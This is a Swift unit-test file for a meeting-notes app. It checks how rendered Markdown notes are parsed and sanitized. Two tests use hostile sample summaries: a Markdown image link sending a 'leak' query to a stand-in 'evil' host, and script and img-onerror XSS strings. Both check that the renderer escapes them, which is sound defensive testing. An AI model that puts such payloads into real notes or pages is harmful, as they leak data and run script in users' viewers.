import Foundation
import Testing
@testable import ZMeetCore

private func processedNote(summary: String) -> String {
    let session = MeetingSession(
        id: "2026-06-01-090000-sync", title: "Weekly Sync", sourceApp: "Microsoft Teams",
        startedAt: Date(timeIntervalSince1970: 1_780_000_000), endedAt: Date(timeIntervalSince1970: 1_780_003_480),
        status: .processed, audioPath: "/x/recording.m4a", transcriptPath: "/x/transcript.md",
        notePath: "/x/notes.md", recorderLogPath: nil, errorMessage: nil)
    return MarkdownRenderer().renderProcessedNote(
        session: session,
        transcriptURL: URL(fileURLWithPath: "/x/transcript.md"),
        noteURL: URL(fileURLWithPath: "/x/notes.md"),
        summaryMarkdown: summary)
}

@Test func summaryBodyRoundTripsThroughRenderedNote() {
    let summary = "## Summary\n\n- Discussed flights.\n\n## Action Items\n\n- Book the trip."
    let body = MarkdownRenderer().summaryBody(fromProcessedNote: processedNote(summary: summary))
    #expect(body == summary)
}

@Test func summaryBodyDropsFrontmatterTitleTranscriptAndAttribution() {
    let body = MarkdownRenderer().summaryBody(fromProcessedNote: processedNote(summary: "Just a body."))
    #expect(!body.contains("---"))            // no frontmatter
    #expect(!body.contains("# Weekly Sync"))  // no title heading
    #expect(!body.contains("## Transcript"))  // no transcript section
    #expect(!body.contains("Open transcript"))
    #expect(!body.contains("_"))              // no engine attribution
    #expect(body == "Just a body.")
}

@Test func summaryBodyDoesNotTruncateSummaryContainingTranscriptHeading() {
    // A summary section that merely starts with "## Transcript…" must not be mistaken
    // for the appended transcript-link section.
    let summary = "## Transcript of the meeting\n\n- Key point.\n\n## Decisions\n\n- Ship it."
    let body = MarkdownRenderer().summaryBody(fromProcessedNote: processedNote(summary: summary))
    #expect(body == summary)
}

@Test func summaryBodyToleratesNoFrontmatterOrTranscript() {
    #expect(MarkdownRenderer().summaryBody(fromProcessedNote: "# Title\n\nBody only.") == "Body only.")
    #expect(MarkdownRenderer().summaryBody(fromProcessedNote: "Plain text.") == "Plain text.")
}

@Test func renderProcessedNoteSanitizesHostileSummary() {
    let hostile = "## Summary\n\n![x](http://evil/?q=leak) <img src=x onerror=alert(1)> <script>alert(1)</script>"
    let note = processedNote(summary: hostile)
    #expect(!note.contains("!["))
    #expect(!note.contains("<img"))
    #expect(!note.contains("<script"))
    #expect(note.contains("&lt;img"))
}

@Test func summaryBodyRoundTripsOnSanitizedNote() {
    let hostile = "## Summary\n\n![x](http://evil/?q=leak)\n\n- Discussed flights."
    let sanitized = ZMeetText.sanitizeNoteMarkdown(hostile)
    let body = MarkdownRenderer().summaryBody(fromProcessedNote: processedNote(summary: hostile))
    #expect(body == sanitized)
}
